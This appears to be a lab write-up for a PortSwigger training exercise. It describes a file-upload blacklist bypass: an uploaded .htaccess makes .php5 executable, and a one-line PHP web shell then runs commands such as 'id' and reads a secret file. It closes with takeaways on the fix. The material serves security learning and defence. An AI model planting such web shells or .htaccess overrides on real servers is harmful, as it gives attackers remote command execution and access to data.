# Lab 04 — Web shell upload via extension blacklist bypass

**Difficulty:** 🟡 Practitioner  
**Technique:** File Upload — extension blacklist bypass via `.htaccess`  
**Link:** https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass

---

## Concept

The application blacklists common executable extensions (`.php`, etc.) but allows uploading configuration files. By uploading a malicious `.htaccess` file first, a new extension (e.g. `.php5`) can be registered as executable by Apache — effectively bypassing the blacklist without touching any blocked extension.

---

## Process

### Step 1 — Upload a malicious `.htaccess`

Intercept the upload POST in Burp and replace the file with:

```
filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .php5
```

This tells Apache to treat `.php5` files as executable PHP.

### Step 2 — Upload the web shell with the new extension

```
filename="shell.php5"
Content-Type: image/jpeg

<?php echo system($_GET['command']); ?>
```

### Step 3 — Verify RCE

```
GET /files/avatars/shell.php5?command=id HTTP/2
```

### Step 4 — Exfiltrate the secret

```
GET /files/avatars/shell.php5?command=cat+/home/carlos/secret HTTP/2
```

---

## Issues encountered

None significant — the two-upload sequence is straightforward once the `.htaccess` trick is understood.

---

## Takeaways

- Blacklisting extensions is bypassable if the server allows uploading configuration files
- `.htaccess` files can redefine which extensions Apache treats as executable
- The fix: block `.htaccess` uploads, or better yet use a whitelist of explicitly allowed extensions
- Two uploads are required: the config file first, then the payload

---

## References

- [File Upload Vulnerabilities — PortSwigger](https://portswigger.net/web-security/file-upload)
